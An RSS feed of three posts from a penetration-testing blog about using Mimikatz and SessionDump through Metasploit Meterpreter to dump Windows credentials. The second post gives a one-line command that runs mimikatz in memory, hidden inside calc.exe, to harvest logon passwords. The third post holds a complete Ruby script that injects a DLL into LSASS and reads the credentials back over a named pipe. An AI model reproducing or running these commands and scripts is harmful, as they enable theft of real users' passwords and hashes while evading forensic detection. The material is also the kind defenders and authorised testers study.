<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Mimikatz on Room362</title>
    <link>http://localhost:1313/tags/mimikatz/</link>
    <description>Recent content in Mimikatz on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Mon, 08 Apr 2013 09:58:20 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/tags/mimikatz/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Sessiondump Meterpreter Extension</title>
      <link>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</link>
      <pubDate>Mon, 08 Apr 2013 09:58:20 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2013/2013/4/8/sessiondump-meterpreter-extension/</guid>
      <description>&lt;p&gt;Mimikatz is awesome right, so is WCE. But both have one fatal flaw, even though you can execute them in memory &lt;a href=&#34;http://localhost:1313/blog/2012/9/6/completely-in-memory-mimikatz-with-metasploit.html&#34;&gt;{link}&lt;/a&gt; - you still have to have the binaries, remember the command to execute it in memory, and ultimately transfer the entire binary over so that metasploit can do its thing.&lt;/p&gt;

&lt;p&gt;Then along came SessionDump. I only noticed this because someone was tweeting congratulations to someone on writing it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at205-55-4820am.png.48%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 5 55 48 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;No blog post or huge Vegas lights talk on it at DefCon or Blackhat. Just posted online in a corner of the Internet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at206-57-4020pm.png.40%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 6 57 40 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.hsc.fr/ressources/outils/sessiondump/&#34;&gt;http://www.hsc.fr/ressources/outils/sessiondump/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Before we get started lets be clear about one thing. Sessiondump while awesome doesn&amp;rsquo;t do everything that Mimikatz does. However, it does do the feature of mimikatz that I do use the most, the logged on user hash dumping as well as the wdigest clear text password dumping. It does this as a Meterpreter extension that operates using reflective DLL injection. Does that solve our minor issues we had with mimikatz, as of right now, only partially. This code was simply posted online, not in a pull request or submitted to Metasploit in any way. So you still have to have the binary + code. What about the remembering, surely it makes it so I can just tab complete my way to passwords right? Yup, it does, but until/if it is in the Metasploit trunk you will still have to remember how to get it installed (which we will go over in a bit). The final question is yes it does still transfer a complete DLL over to the host same as any of the other extensions (not to disk mind you, just memory),.&lt;/p&gt;

&lt;p&gt;Without further ado lets go ahead and get the file and do a bunch of extracting. &lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-0220pm.png.02%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 02 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at207-15-5420pm.png.54%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 7 15 54 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And finally placing everything in it&amp;rsquo;s correct place, which was nice of the author to make easy by making the archive the same as the Metasploit directory structure:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-33-3120am.png.31%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 33 31 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, everything should be good to go. Lets use this thing. I&amp;rsquo;m using psexec to get a shell but any way you get a windows native meterpreter fine, with one caveat, and its the same as with any of the other aforementioned tools. You need to be Admin (past UAC, w/ SeDebug privilege) or NTAUTHORITY SYSTEM.  After that it&amp;rsquo;s cake, load the extension:&lt;/p&gt;

&lt;p&gt; &lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-0620pm.png.06%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 06 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here is the available commands:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-42-2220pm.png.22%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 42 22 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And run getHashes:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm202.png.04%20PM%202.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM 2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;or getwDigestPasswords:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-3920pm.png.39%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 39 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Thats is, you free passwords, YAY&amp;hellip;&lt;/p&gt;

&lt;p&gt;Possible issues you may run into:&lt;/p&gt;

&lt;p&gt;1) If you are on a x64 box and meterpreter isn&amp;rsquo;t running in a x64 process it will fail saying that it doesn&amp;rsquo;t have the correct version offsets, here is how you can check:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0820at202-40-2920am.png.29%20AM.png&#34; alt=&#34;Screen Shot 2013 04 08 at 2 40 29 AM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;x64 system and Meterpreter is x86/win32. Lets find a good process to migrate into and kick it from there. Winlogon isn&amp;rsquo;t the greatest choices since if meterpreter decides to crash it during migration then the system will go down, whereas a service running as SYSTEM will probably just restart if something fails.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2013/04/screen20shot202013-04-0720at2010-43-0420pm.png.04%20PM.png&#34; alt=&#34;Screen Shot 2013 04 07 at 10 43 04 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;2) If by any chance you are running it against a system the author hasn&amp;rsquo;t gotten the offsets for. I don&amp;rsquo;t&amp;rsquo; have a screenshot for this one because he covers all the languages I have CMs for, but the author was awesome enough to include a few python scripts that can help you generate the correct offsets. I&amp;rsquo;ll show you by running it on my lsass and widgets.dll files even though he already has this data included in the CSV file that comes with session dump.&lt;/p&gt;

&lt;p&gt;Thats all for now folks, may the shells be with you.&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Completely In-memory Mimikatz with Metasploit</title>
      <link>http://localhost:1313/post/2012/201296completely-in-memory-mimikatz-with-metasploit-html/</link>
      <pubDate>Thu, 06 Sep 2012 03:16:47 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/201296completely-in-memory-mimikatz-with-metasploit-html/</guid>
      <description>&lt;p&gt;Executing WCE.exe in memory as demoed by Egypt here: &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&#34;&gt;https://community.rapid7.com/community/metasploit/blog/2012/05/08/eternal-sunshine-of-the-spotless-ram&lt;/a&gt; has two issues with it. 1, you leave a file on disk with your hashes and clear text passwords. That just won&amp;rsquo;t do. 2. There is this DLL called WCEAUX.dll that gets written for the briefest second to disk:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2010-48-5720pm.png.57%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 10 48 57 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;(yes I realize I&amp;rsquo;m running this on disk &amp;lsquo;wce32.exe&amp;rsquo;, but it exhibits the same DLL drop when doing in-memory)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Now, don&amp;rsquo;t get me wrong, I love WCE, and Hernan Ochoa does an amazing job with it, but when it comes down to it, it&amp;rsquo;s the best tool for the job. And today, that&amp;rsquo;s now Mimikatz. &lt;/p&gt;

&lt;p&gt;Just like WCE to execute it in memory you use the -m flag for execute:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;execute -H -i -c -m -d calc.exe -f mimikatz.exe -a &amp;lsquo;&amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; exit&amp;rsquo;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;For mimikatz to automatically send commands require double quotes in the command line arguments, so we use single quotes in meterpreter to encircle the execute arguments (-a). Running first &amp;ldquo;sekurlsa::logonPasswords full&amp;rdquo; then &amp;lsquo;exit&amp;rsquo; to auto-exit mimikatz console. Like so:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2010-57-4520pm.png.45%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 10 57 45 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;And all you get forensically is calc.exe loading a ton of DLLs it has no business loading but no new files touch disk ;-)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mubix.files.wordpress.com/2012/09/screen20shot202012-09-0520at2011-07-3520pm.png.35%20PM.png&#34; alt=&#34;Screen Shot 2012 09 05 at 11 07 35 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The downloads for Mimikatz are were they always are:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.gentilkiwi.com/mimikatz&#34;&gt;http://blog.gentilkiwi.com/mimikatz&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Oh, did I mention that Mimikatz is open source and the in-memory goodness has been uploaded to svn:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/mimikatz/&#34;&gt;https://code.google.com/p/mimikatz/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Awesome work @&lt;a href=&#34;http://twitter.com/gentilkiwi&#34;&gt;gentilkiwi&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you want to check out the the fix that was implemented to work with Meterpreter&amp;rsquo;s in-memory goodness check here:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://code.google.com/p/mimikatz/source/detail?r=33&#34;&gt;https://code.google.com/p/mimikatz/source/detail?r=33&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Integration of Mimikatz into Metasploit Stage1</title>
      <link>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</link>
      <pubDate>Fri, 15 Jun 2012 14:55:55 +0000</pubDate>
      
      <guid>http://localhost:1313/post/2012/2012615integration-of-mimikatz-into-metasploit-stage1-html/</guid>
      <description>&lt;p&gt;One of the powers of Metasploit is it&amp;rsquo;s ability to stay memory resident. Through the use of reflective DLL injection even keeping new functionality the attack loads from ever touching disk. Well, the first thing I wanted to do with Mimikatz is get to that same level.&lt;/p&gt;

&lt;p&gt;Here is my first step to that end; a railgun based Meterpreter script. Now before going all reflective with it I needed to understand how the DLL worked. Thankfully &lt;a href=&#34;https://twitter.com/gentilkiwi&#34;&gt;@gentilkiwi&lt;/a&gt; stepped in and stopped my head from getting bloody. In this first step we will be removing the need for the mimikatz.exe binary, still needing the DLL to be uploaded, but we&amp;rsquo;ll get there in the subsequent posts.&lt;/p&gt;

&lt;p&gt;Ignore the do_cmd for now and I stepped through &lt;a href=&#34;http://localhost:1313/blog/2011/5/30/remote-dll-injection-with-meterpreter.html&#34;&gt;remote DLL injection here&lt;/a&gt;. So the first odd lines is &lt;/p&gt;

&lt;p&gt;handle = client.railgun.kernel32.CreateNamedPipeW(&amp;rsquo;\.\pipe\kiwi\mimikatz&amp;rsquo;, &amp;lsquo;PIPE_ACCESS_DUPLEX&amp;rsquo;, &amp;lsquo;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&amp;rsquo;, 1, 0, 0, 30000,nil)[&amp;lsquo;return&amp;rsquo;]&lt;/p&gt;

&lt;p&gt;connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Essentially these connect to the &lt;a href=&#34;http://en.wikipedia.org/wiki/Named_pipe&#34;&gt;Named Pipe&lt;/a&gt; that the sekurlsa.dll uses to talk to the mimikatz.exe in it&amp;rsquo;s normal operation. Then we just use the windows API call &amp;ldquo;ReadFile&amp;rdquo; from there on out.&lt;/p&gt;

&lt;p&gt;client.railgun.kernel32.ReadFile(handle,248,248,4,nil)&lt;/p&gt;

&lt;p&gt;One of the draw backs to doing this all remotely is that Railgun doesn&amp;rsquo;t have the memory management insight like the Windows OS does. Being able to know when pipes are ready to be read or written to is  a bit of a challenge and the call hangs your IRB / meterpreter session if you get it wrong. I&amp;rsquo;ve overcome this for the initial &amp;ldquo;banner&amp;rdquo; that sekurlsa writes by knowing the exact length (248 bytes in this case) of the text. For subsequent commands like &amp;ldquo;ping&amp;rdquo; and &amp;ldquo;getLogonPasswords&amp;rdquo; I simply have to read one character at a time, which is a slow process but removes any chance of getting hung. (Two bytes for every Unicode character)&lt;/p&gt;

&lt;p&gt;If you have any questions on how/why this works or have a better way please leave your comments and questions below or hit me up on twitter!&lt;/p&gt;

&lt;p&gt;Meterpreter Script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;def do_cmd(handle,cmd)
    ucommand = Rex::Text.to_unicode(cmd)
    sendcmd = client.railgun.kernel32.WriteFile(handle,ucommand,ucommand.size,4,nil)
    good2go = false
    newline = false
    readstring = []
    while good2go == false
        # Have to pull data 1 unicode character at a time
        # this is because the pipe won&#39;t write or read if
        # too much was written or read by the &amp;quot;client&amp;quot; (us)
        pull = client.railgun.kernel32.ReadFile(handle,2,2,4,nil)
        # Check to see if our end of read check is there: n000 @00
        if pull[&#39;lpBuffer&#39;] == &amp;quot;@00&amp;quot; and newline == true
            good2go = true
        else
            readstring &amp;lt;&amp;lt; pull[&#39;lpBuffer&#39;]
        end

        # Ready the newline var for previous check on next loop
        if pull[&#39;lpBuffer&#39;] == &amp;quot;n00&amp;quot;
            newline = true
        else
            newline = false
        end
    end

    print_status(readstring.join(&amp;quot;&amp;quot;))
end

print_status(&amp;quot;x86 Detected - Using x86 mimikatz&amp;quot;)
handle = client.railgun.kernel32.CreateNamedPipeW(&#39;\\.\pipe\kiwi\mimikatz&#39;, &#39;PIPE_ACCESS_DUPLEX&#39;, &#39;PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT&#39;, 1, 0, 0, 30000,nil)[&#39;return&#39;]
print_status(&amp;quot;Handle: #{handle}&amp;quot;)
framework.threads.spawn(&#39;injectlsass&#39;,false) {
    pid = client.sys.process[&#39;lsass.exe&#39;]
    print_status(&amp;quot;LSASS located at PID: #{pid}&amp;quot;)
    pathtomimi = &amp;quot;C:\sekurlsa.dll&amp;quot;

    pay = client.framework.payloads.create(&amp;quot;windows/loadlibrary&amp;quot;)
    pay.datastore[&amp;quot;DLL&amp;quot;] = pathtomimi
    pay.datastore[&amp;quot;EXITFUNC&amp;quot;] = &#39;thread&#39;

    raw = pay.generate
    targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
    mem = targetprocess.memory.allocate(raw.length + (30024))
    targetprocess.memory.write(mem, raw)
    sleep(2)
    targetprocess.thread.create(mem, 0)
    print_status(&amp;quot;Successfully Injected into LSASS&amp;quot;)
}
print_status(&amp;quot;Waiting for LSASS injection to complete&amp;quot;)
connectedlsass = client.railgun.kernel32.ConnectNamedPipe(handle,nil)
print_status(&amp;quot;Mimikatz has called home, ready for command&amp;quot;)
sleep(2)
print_status(&amp;quot;Reading banner&amp;quot;)
client.railgun.kernel32.ReadFile(handle,248,248,4,nil)
print_status(&amp;quot;Doing a quick ping to make sure things are working...&amp;quot;)
do_cmd(handle,&#39;ping&#39;)
print_status(&amp;quot;If you made it this far it worked, doing getLogonPasswords&amp;quot;)
do_cmd(handle, &#39;getLogonPasswords&#39;)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>